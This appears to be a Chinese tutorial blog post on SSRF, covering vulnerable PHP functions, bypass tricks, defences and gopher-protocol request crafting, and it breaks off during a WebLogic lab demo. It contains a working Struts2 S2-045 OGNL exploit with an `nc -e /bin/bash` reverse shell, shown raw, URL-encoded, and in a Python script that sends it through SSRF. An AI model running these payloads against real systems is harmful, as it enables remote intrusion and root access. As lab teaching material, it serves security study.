+++
title = "SSRF服务端请求伪造漏洞"
date = 2021-06-25

[taxonomies]
categories = ["安全"]
+++

# 什么是SSRF
SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由**攻击者构造**形成**由服务端发起**请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够**请求到**与它相连而**与外网隔离的内部系统**）<br />能够对外发送网络请求的点都有可能存在ssrf漏洞
<!-- more -->

漏洞成因<br />[http://www.xxx.com/a.php?image=http://192.168.0.109/xxx.png](http://www.xxx.com/a.php?image=http://192.168.0.109/xxx.png)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558154091-48f754d2-e6f5-4cf8-a21d-e990fd35ec79.png#align=left&display=inline&height=589&id=NqbdT&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1177&originWidth=2200&size=1022377&status=done&style=none&width=1100)<br />由于业务需要，服务端程序需要从其他服务器应用中获取数据，例如获取图片、数据等，但是由于服务器没有对其请求的目标地址做过滤和限制，导致黑客可以利用此缺陷请求任意服务器资源，其中就包含隐匿在内网的应用。很多企业认为服务器在内网不会受到黑客攻击，便放任漏洞不管，不做补丁修复和版本升级，弱口令遍布内网。但是在SSRF漏洞面前这些漏洞都会成为黑客的“盘中餐”。<br />SSRF漏洞一般为HTTP／HTTPS方式出现，但类似TCP Connect方式也可以探测内网的IP活跃状态和端口的开放情况，但此类危害较小。

SSRF漏洞出现的位置

- 服务器主动发起网络请求，例如HTTP／HTTPS／Socket
- 分享功能，通过URL分享网页内容，[微博SSRF](https://link.zhihu.com/?target=http%3A//www.360bug.net/index.php/archives/49/%3Ffrom%3Dtimeline%26isappinstalled%3D0)
- 图片加载、下载功能
- 邮件系统
- api远程调用
- 只要是服务器可以主动发起网络请求便可能出现
# SSRF漏洞的危害

- 对目标服务器所在的内网进行IP存活性扫描和端口扫描
- 利用扫描的指纹信息判断开放的服务，从而对内网的主机进行攻击
- 识别内网WEB应用指纹，判断应用类型进行攻击
- 使用特定协议攻击应用（gopher、dict、file、FTP／SFTP等）
# SSRF漏洞的业务场景

- 分享：通过URL地址分享网页内容
- 转码服务（手机适配）
- 在线翻译（百度翻译搜索检索IP的网址：[http://www.ip.cn](http://www.ip.cn)）
- 图片加载与下载：通过URL地址加载或下载图片
- 图片、文章收藏功能
- 未公开的api实现以及其他调用URL的功能
- 从URL关键字中寻找（share、wap、url、link、src、source、target、sourceURl、 imageURL、domain）

1. 图片加载与下载

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558913214-24d93aa8-d7de-4dd6-a007-93fc3a37dcc1.png#align=left&display=inline&height=736&id=gVCGs&margin=%5Bobject%20Object%5D&name=image.png&originHeight=736&originWidth=1504&size=656515&status=done&style=none&width=1504)

2. 分享：通过URL地址分享网页内容

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558913791-ecfca080-ed2c-442b-96e1-e255cc3e200a.png#align=left&display=inline&height=399&id=d7Fbc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=798&originWidth=1478&size=602333&status=done&style=none&width=739)

3. 翻译：百度翻译功能会请求ip138，此时ip138便能查询出百度翻译服务器的外网IP

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558955388-123a425f-b931-4be1-a709-d0847c0d4154.png#align=left&display=inline&height=395&id=AtyCw&margin=%5Bobject%20Object%5D&name=image.png&originHeight=790&originWidth=1374&size=863962&status=done&style=none&width=687)
# 引发SSRF漏洞的函数

- file_get_contents()
- fsockopen()
- curl_exec()

**file_get_contents()**<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558338105-294f2372-ce5b-4137-86a3-909404c71172.png#align=left&display=inline&height=230&id=TsGsW&margin=%5Bobject%20Object%5D&name=image.png&originHeight=460&originWidth=866&size=49238&status=done&style=none&width=433)<br />以上代码是获取post参数url中的值地址，通过file_get_contents获取url中的图片内容，保存到image目录下，然后显示。<br />file_get_contents函数使用前需要将php.ini的allow_url_fopen设置为ON。<br />以上的漏洞代码是存在SSRF漏洞的，可以控制url参数，自定义任意的URL，包括内网的URL，例如现在验证内网192.168.0.118是否开启了6379端口，可以做以下访问<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558366722-a14292a6-8f94-4a09-951c-8fd867a6c00b.png#align=left&display=inline&height=186&id=zrPpH&margin=%5Bobject%20Object%5D&name=image.png&originHeight=372&originWidth=1914&size=169774&status=done&style=none&width=957)<br />根据上图提示说明开启了6379，接下来测试是否开启了8888端口<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558473996-749d2b12-3c10-4a9c-9be9-c07dabc40489.png#align=left&display=inline&height=164&id=z5vBN&margin=%5Bobject%20Object%5D&name=image.png&originHeight=328&originWidth=1466&size=105648&status=done&style=none&width=733)<br />测试8888端口时，根据上图提示，显示错误信息，说明端口未开放。接下来测试80端口，看显示结果（因为109的80端口是开放的，所以测试下，看回显内容）<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624611964815-95164369-c3de-4d42-983a-f7b055b31990.png#align=left&display=inline&height=216&id=LBRdM&margin=%5Bobject%20Object%5D&name=image.png&originHeight=432&originWidth=1184&size=86715&status=done&style=none&width=592)<br />访问109的80端口并未报错，此时，查看图片内容（选中图片，点复制链接），如下图：<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624612001640-30c1b72d-b3b0-4c7e-9a6d-856af69ad9f8.png#align=left&display=inline&height=381&id=CGAE3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=762&originWidth=1712&size=207894&status=done&style=none&width=856)<br />发现请求的80端口的数据被写入到了图片问题中，符合代码预期。除了可以探测端口，也可以做文件包含漏洞的利用，这里不再细说文件包含的知识。

**fsockopen()**<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558599883-18beb195-037a-4c4b-a182-be73d11365bd.png#align=left&display=inline&height=431&id=cLTdq&margin=%5Bobject%20Object%5D&name=image.png&originHeight=862&originWidth=1518&size=126360&status=done&style=none&width=759)<br />以上函数是接受url和port来制定socket访问的地址和端口，由于地址和端口用户可控，所以可以用来SSRF漏洞的利用。<br />例如可以做以下访问可以探测119的3306端口是否开放：<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558630672-9214aeb2-a4ae-43cc-8ebc-5228e42454d9.png#align=left&display=inline&height=384&id=K7MSU&margin=%5Bobject%20Object%5D&name=image.png&originHeight=384&originWidth=1676&size=260029&status=done&style=none&width=1676)<br />做以下访问可以探测109的3306是否开放：<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558631019-9fc710ba-d52f-46f6-8040-dbcd346ef87f.png#align=left&display=inline&height=147&id=xCvAB&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=1544&size=78865&status=done&style=none&width=772)<br />未出现错误信息说明端口开放

**curl_exec()**<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558683676-240f8f92-6cd6-4c31-9d30-7d964a23c1ce.png#align=left&display=inline&height=206&id=UygUV&margin=%5Bobject%20Object%5D&name=image.png&originHeight=412&originWidth=1044&size=44782&status=done&style=none&width=522)<br />curl_exec函数是危害最大的函数，也是需要重点讲的函数。以上代码是获取参数url的值，使用curl进行访问。<br />curl_exec的使用需要3个条件：<br />1、PHP版本>=5.3<br />2、开启extension=php_curl.dll<br />3、--wite-curlwrappers（编译PHP时用，此时不需要，可忽略）<br />使用dict协议探测22端口（后面会讲dict协议）<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558696648-b7dd19d4-56e0-4f9c-812b-ef79a0b0a941.png#align=left&display=inline&height=78&id=xbT0I&margin=%5Bobject%20Object%5D&name=image.png&originHeight=156&originWidth=1538&size=89120&status=done&style=none&width=769)<br />使用dict协议探测6379端口<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558717469-21f223fa-bbad-4257-895a-ff41da8487f1.png#align=left&display=inline&height=69&id=JABwP&margin=%5Bobject%20Object%5D&name=image.png&originHeight=138&originWidth=1538&size=94799&status=done&style=none&width=769)<br />可以根据回显的banner信息判断目标端口运行的服务为ssh和redis服务，dict协议还可以做到执行命令的功能。
# SSRF漏洞绕过方式

- 攻击本机

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624559049882-552d20c3-874a-4878-bad3-9c9947ca3945.png#align=left&display=inline&height=77&id=nMviQ&margin=%5Bobject%20Object%5D&name=image.png&originHeight=154&originWidth=1512&size=113423&status=done&style=none&width=756)

- 利用@绕过

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624559057665-808386a7-5ee1-431e-8757-746854f6dd73.png#align=left&display=inline&height=85&id=nUwn9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=170&originWidth=1512&size=187252&status=done&style=none&width=756)

- 利用短地址绕过

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624559065931-3871dc73-c9d1-4d94-817b-40655176ddbc.png#align=left&display=inline&height=81&id=taNXG&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=1512&size=296348&status=done&style=none&width=756)

- 利用Enclosed alphanumerics

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624559093589-462bc619-3f79-4656-8d1e-c7ce427fda80.png#align=left&display=inline&height=273&id=as2CK&margin=%5Bobject%20Object%5D&name=image.png&originHeight=546&originWidth=1472&size=896056&status=done&style=none&width=736)

- 利用句号代替点绕过

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624559107978-f481f39a-6741-4e66-9763-3a628bb8ec52.png#align=left&display=inline&height=46&id=A4d71&margin=%5Bobject%20Object%5D&name=image.png&originHeight=92&originWidth=1104&size=22124&status=done&style=none&width=552)

- 特殊域名绕过

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624559126327-adefa8ec-d253-4535-b471-d23d093c949b.png#align=left&display=inline&height=67&id=XJOit&margin=%5Bobject%20Object%5D&name=image.png&originHeight=134&originWidth=1104&size=102307&status=done&style=none&width=552)

- 使用进制绕过，例如127.0.0.1

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624559148740-0c7bf54c-4421-45ea-92f7-f988a776498d.png#align=left&display=inline&height=172&id=y7bel&margin=%5Bobject%20Object%5D&name=image.png&originHeight=344&originWidth=1506&size=570210&status=done&style=none&width=753)
# SSRF漏洞的防御

- 禁止302跳转，或者没跳转一次都进行校验目的地址是否为内网地址或合法地址。
- 过滤返回信息，验证远程服务器对请求的返回结果，是否合法。
- 禁用高危协议，例如：gopher、dict、ftp、file等，只允许http/https设置 URL白名单或者限制内网IP
- 限制请求的端口为http的常用端口，或者根据业务需要治开放远程调用服务的端口
- catch错误信息，做统一错误信息，避免黑客通过错误信息判断端口对应的服务
# SSRF漏洞的应用
## Gopher协议的应用
### 什么是Gopfer协议
**定义**：Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；<br />gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议<br />**限制**：gopher协议在各个编程语言中的使用限制<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624627608419-8e271cdc-b44f-4c77-9a38-4c2d1be9e29e.png#align=left&display=inline&height=162&id=uea6ec4c9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=1314&size=120269&status=done&style=none&width=1314)<br />--wite-curlwrappers：运用curl工具打开url流<br />curl使用curl --version查看版本以及支持的协议<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624627634358-b9c2abfd-87e9-4057-8ffb-1df453d8e949.png#align=left&display=inline&height=168&id=ud4bd65b6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=168&originWidth=1132&size=252658&status=done&style=none&width=1132)<br />**Gopher协议格式**：
```http
URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流
```

- gopher的默认端口是70
- 如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&也需要进行URL编码

**Gopher发送请求HTTP GET请求：**<br />使用Gopher协议发送一个请求，环境为：nc起一个监听，curl发送gopher请求<br />nc启动监听，监听2333端口：nc -lp 2333<br />使用curl发送http请求，命令为：
```bash
margine:~ margin$ curl gopher://192.168.0.119:2333/abcd
```
此时nc收到的消息为：
```bash
margine:~ margin$ nc -lp 2333
bcd
```
可以发现url中的a没有被nc接受到，如果命令变为：
```bash
margine:~ margin$ curl gopher://192.168.0.119:2333/_abcd
```
此时nc收到的消息为：
```bash
margine:~ margin$ nc -lp 2333
abcd
```
所以需要在使用gopher协议时在url后加入一个字符（该字符可随意写）<br />那么如何发送HTTP的请求呢？例如GET请求。此时我们联想到，直接发送一个原始的HTTP包不就可以吗？在gopher协议中发送HTTP的数据，需要以下三步：<br />1、构造HTTP数据包<br />2、URL编码、替换回车换行为%0d%0a<br />3、发送gopher协议

我准备了一个PHP的代码，如下：
```php
<?php
    echo "Hello ".$_GET["name"]."\n"
?>
```
一个GET型的HTTP包，如下：
```http
GET /ssrf/base/get.php?name=Margin HTTP/1.1
Host: 192.168.0.109
```
URL编码后为：
```http
curl gopher://192.168.0.109:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.0.109%0d%0A
```
在转换为URL编码时候有这么几个坑：<br />1、问号（？）需要转码为URL编码，也就是%3f<br />2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a<br />3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）

**Gopher发送请求HTTP POST请求：**<br />发送POST请求前，先看下POST数据包的格式
```http
POST /ssrf/base/post.php HTTP/1.1
host:192.168.0.109

name=Margin
```
那我们将上面的POST数据包进行URL编码并改为gopher协议
```http
curl gopher://192.168.0.109:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:192.168.0.1090d%0A%0d%0Aname=Margin%0d%0A
```
post.php的代码为
```php
<?php
    echo "Hello ".$_POST["name"]."\n"
?>
```
使用curl发起gopher的POST请求后，结果为：<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624628140442-97b1c6e7-7c2e-41f1-9a08-937dcb63a305.png#align=left&display=inline&height=820&id=u17f57e99&margin=%5Bobject%20Object%5D&name=image.png&originHeight=820&originWidth=2243&size=1400583&status=done&style=none&width=2243)<br />根据上图发现返回的包爆了501的错误，我的思路是这样的：查看Apache的正常日志和错误日志、查找POST请求中所需的字段。下面分别是正常日志和错误日志的截图：
```
192.168.0.119 - - [07/Mar/2020:15:19:49 +0800] "POST /ssrf/base/post.php HTTP/1.1" 200 7
192.168.0.119 - - [07/Mar/2020:15:19:49 +0800] "name=Margin" 501 213
[Sat Mar 07 15:38:50 2020] [error] [client 192.168.0.119] Invalid method in request name=Margin
```
这里有个疑问：为什么发起了2次请求？为什么会把参数name=Margin当作一个请求？这个地方我调试了很久，发现问题出现在POST请求头中，我之前发POST请求都是直接用脚本，但从来没考虑过哪些参数是POST请求必须的，经过排查，发现有4个参数为必要参数（四个参数的含义不再赘述）：
```http
POST /ssrf/base/post.php HTTP/1.1
host:192.168.0.109
Content-Type:application/x-www-form-urlencoded
Content-Length:11

name=Margin
```
现在我们将它进行URL编码：
```http
curl gopher://192.168.0.109:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:192.168.0.109%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=Margin%0d%0A
```
再次发送请求的结果为：<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624628323373-f064bad3-dbc3-4bb8-a987-6fb0848470c0.png#align=left&display=inline&height=510&id=u6318a58c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=510&originWidth=2243&size=1021097&status=done&style=none&width=2243)<br />发现请求正常，OK，那我们现在就介绍完了gopher协议的GET和POST请求。
### 如何使用Gopher协议反弹shell（渗透Java的Struts2框架）
Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架 (_**摘自百度百科**_)<br />今天我们用到的漏洞是Struts2-045漏洞，相信很多大佬不陌生，以下为S2-045漏洞反弹shell的利用代码，我们在本地机器上执行：nc -lp 6666
```http
GET /S2-045/ HTTP/1.1
Host: 192.168.0.119
Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='nc -e /bin/bash 192.168.0.119 6666').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```
我们将其变为gopher所能使用的请求
```http
curl gopher://192.168.0.119:8080/_GET%20/S2-045/%20HTTP/1.1%0d%0aHost:192.168.0.119%0d%0aContent-Type:%25%7b%28%23%5f%3d%27%6d%75%6c%74%69%70%61%72%74%2f%66%6f%72%6d%2d%64%61%74%61%27%29%2e%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3f%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3d%23%64%6d%29%3a%28%28%23%63%6f%6e%74%61%69%6e%65%72%3d%23%63%6f%6e%74%65%78%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%3d%23%63%6f%6e%74%61%69%6e%65%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%6f%6e%74%65%78%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%29%29%2e%28%23%63%6d%64%3d%27%6e%63%20%2d%65%20%2f%62%69%6e%2f%62%61%73%68%20%31%39%32%2e%31%36%38%2e%30%2e%31%31%39%20%36%36%36%36%27%29%2e%28%23%69%73%77%69%6e%3d%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%53%79%73%74%65%6d%40%67%65%74%50%72%6f%70%65%72%74%79%28%27%6f%73%2e%6e%61%6d%65%27%29%2e%74%6f%4c%6f%77%65%72%43%61%73%65%28%29%2e%63%6f%6e%74%61%69%6e%73%28%27%77%69%6e%27%29%29%29%2e%28%23%63%6d%64%73%3d%28%23%69%73%77%69%6e%3f%7b%27%63%6d%64%2e%65%78%65%27%2c%27%2f%63%27%2c%23%63%6d%64%7d%3a%7b%27%2f%62%69%6e%2f%62%61%73%68%27%2c%27%2d%63%27%2c%23%63%6d%64%7d%29%29%2e%28%23%70%3d%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%23%63%6d%64%73%29%29%2e%28%23%70%2e%72%65%64%69%72%65%63%74%45%72%72%6f%72%53%74%72%65%61%6d%28%74%72%75%65%29%29%2e%28%23%70%72%6f%63%65%73%73%3d%23%70%2e%73%74%61%72%74%28%29%29%2e%28%23%72%6f%73%3d%28%40%6f%72%67%2e%61%70%61%63%68%65%2e%73%74%72%75%74%73%32%2e%53%65%72%76%6c%65%74%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%40%67%65%74%52%65%73%70%6f%6e%73%65%28%29%2e%67%65%74%4f%75%74%70%75%74%53%74%72%65%61%6d%28%29%29%29%2e%28%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%63%6f%70%79%28%23%70%72%6f%63%65%73%73%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%72%6f%73%29%29%2e%28%23%72%6f%73%2e%66%6c%75%73%68%28%29%29%7d%0d%0a
```
一定要注意最后加上%0d%0a，以及很多URL编码工具将会回车换行转码为%0a，一定要自己替换为%0a%0d<br />发送请求后可以反弹shell
```bash
margine:~ margin$ nc -l 6666
id
uid=0(root) gid=0(root) groups=0(root)
```
### 在SSRF中如何使用gopher协议反弹shell

1. 我们先准备了一个带有ssrf漏洞的页面，代码如下：
```php
<?php
    $url = $_GET['url'];
    $curlobj = curl_init($url);
    echo curl_exec($curlobj);
?>
```
这里需要注意的是，**你的PHP版本必须大于等于5.3**，并且在PHP.ini文件中开启了extension=php_curl.dll<br />2. 我在机器上开启了一个监听nc -lp 6666<br />   然后在浏览器中访问：
```http
http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.119:6666/_abc
```
可以看到nc接收到了消息，没有问题。
```bash
C:\Documents and Settings\Administrator\桌面>nc -lp 6666
abc
```
现在我们想，如何使用SSRF漏洞配合gopher协议来获取shell呢？我们的环境如下<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624628840748-61e0e10e-f214-4fa7-9e0f-a0decad75f91.png#align=left&display=inline&height=1228&id=ue51efcce&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1228&originWidth=2243&size=1493101&status=done&style=none&width=2243)<br />上图就不具体说了，是一个典型的ssrf利用的解释图。<br />在使用ssrf去获取struts2的shell时，遇到了两次困难：

- PHP的curl_exec函数没有发起gopher的请求（这个问题上面已经说过）
- gopher一直请求不到目标页面

根据我的试错经历，我梳理了下如何一步步的完成gopher请求获取shell。<br />首先我们先做一些简单的事情，顺序如下：

1. 使用ssrf漏洞发起gopher请求，访问前面用到的get.php
1. 使用ssrf漏洞发起gopher请求，获取struts2主机的shell

**第一步**：<br />准备好访问get.php的数据包（**照搬的本文开始的包**）
```http
gopher://192.168.0.109:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.0.109%0d%0A
```
那我们现在是否可以这样来组成我们的URL？
```http
http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.109:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.0.109%0d%0A
```
我们来测试下，结果如下：<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624628998687-54fa0449-5416-4048-ad52-696f640d2836.png#align=left&display=inline&height=151&id=ufa816635&margin=%5Bobject%20Object%5D&name=image.png&originHeight=151&originWidth=2243&size=111812&status=done&style=none&width=2243)<br />发现并没有出现get页面的hello Margin，说明请求失败，这个地方卡了一会，发现是因为在PHP在接收到参数后会做一次URL的解码，正如我们上图所看到的，%20等字符已经被转码为空格。所以，curl_exec在发起gopher时用的就是没有进行URL编码的值，就导致了现在的情况，所以我们要进行二次URL编码。编码结果如下：
```http
http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher%3A%2F%2F192.168.0.109%3A80%2F_GET%2520%2Fssrf%2Fbase%2Fget.php%253fname%3DMargin%2520HTTP%2F1.1%250d%250AHost%3A%2520192.168.0.109%250d%250A
```
此时发起请求，得到如下结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624629042684-80911512-fba1-4f86-aec4-9ec7195b50fd.png#align=left&display=inline&height=166&id=u7602c9d5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=166&originWidth=2243&size=189656&status=done&style=none&width=2243)<br />发现已经正常，此时便说明我们的环境没有问题，SSRF漏洞利用正常，开始接下来的步骤。<br />**第二步**：<br />准备好struts2-045漏洞的利用代码，并进行二次编码，需要注意的是Content-Type中放了主要的漏洞利用代码，并且特殊字符多，将其单独进行编码，步骤如下：

1. 将gopher协议一直到Content-Type进行二次编码
1. 将Content-Type的值所有字符进行URL二次编码<br />最终得到如下结果(太长，不列中间内容，省略部分为Content-type内容)：
```http
gopher%3A%2F%2F192.168.0.119%3A8080%2F_GET%2520%2FS2-045%2F%2520HTTP%2F1.1%250d%250aHost%3A192.168.0.119%250d%250aContent-Type%3A ......... %0d%0a
```
最终可以获取shell，结果如下：
```bash
margine:~ margin$ nc -l 6666
id
uid=0(root) gid=0(root) groups=0(root)
```
**在试错的过程中发现：URL中的／不能进行两次编码，端口号不可以两次编码,协议名称不可两次转码**

最后附上编码脚本（python2.7）：
```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-
import urllib2,urllib

url = "http://192.168.0.109/ssrf/base/curl_exec.php?url="
header = """gopher://192.168.0.119:8080/_GET /S2-045/ HTTP/1.1
Host:192.168.0.119
Content-Type:"""
cmd = "nc -e /bin/bash 192.168.0.109 6666"
content_type = """%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"""+cmd+"""').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"""
header_encoder = ""
content_type_encoder = ""
content_type_encoder_2 = ""
url_char = [" "]
nr = "\r\n"

# 编码请求头
for single_char in header:
    if single_char in url_char:
        header_encoder += urllib.quote(urllib.quote(single_char,'utf-8'),'utf-8')
    else:
        header_encoder += single_char

header_encoder = header_encoder.replace("\n",urllib.quote(urllib.quote(nr,'utf-8'),'utf-8'))

# 编码content-type，第一次编码
for single_char in content_type:
    # 先转为ASCII,在转十六进制即可变为URL编码
    content_type_encoder += str(hex(ord(single_char)))
content_type_encoder = content_type_encoder.replace("0x","%") + urllib.quote(nr,'utf-8')
# 编码content-type，第二次编码
for single_char in content_type_encoder:
    # 先转为ASCII,在转十六进制即可变为URL编码
    content_type_encoder_2 += str(hex(ord(single_char)))
content_type_encoder_2 = content_type_encoder_2.replace("0x","%")
exp = url + header_encoder + content_type_encoder_2
print exp
request = urllib2.Request(exp)
response = urllib2.urlopen(request).read()
print response
```
## 利用weblogic的SSRF漏洞探测内网并返回shell
这里环境采用vulhub的docker环境，在centos虚拟机中启动docker-compose，centOS的IP地址为192.168.31.185

1. 利用ssrf探测内网

打开环境<br />![Snipaste_2021-06-27_04-08-06.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624738117514-8b415229-4596-459b-b830-ec145a5bae1c.png#align=left&display=inline&height=912&id=u55b146ff&margin=%5Bobject%20Object%5D&name=Snipaste_2021-06-27_04-08-06.png&originHeight=912&originWidth=1920&size=77843&status=done&style=none&width=1920)<br />在三个输入框中随便填入几个数字，点击search，页面回显如上图所示，此ssrf注入点就在这里<br />抓包<br />![Snipaste_2021-06-27_04-07-11.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624738213522-153972bf-070f-4aa5-aa6a-8535e3066719.png#align=left&display=inline&height=983&id=u0b4d8a25&margin=%5Bobject%20Object%5D&name=Snipaste_2021-06-27_04-07-11.png&originHeight=983&originWidth=1694&size=149407&status=done&style=none&width=1694)<br />在包中发现 operator 字样，其中的URL地址 www-3.ibm.com 同刚才页面回显中的一致，将 operator 的值修改为 172.18.0.2:80 ，发包<br />结果如下图右侧所示<br />![Snipaste_2021-06-27_04-13-32.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624738435051-b1e061f1-9c67-4c07-ad5b-1c179d4c2f13.png#align=left&display=inline&height=983&id=u37d95ad4&margin=%5Bobject%20Object%5D&name=Snipaste_2021-06-27_04-13-32.png&originHeight=983&originWidth=1694&size=164786&status=done&style=none&width=1694)<br />“cannot connect”，所以172.18.0.2的80端口并没有开放<br 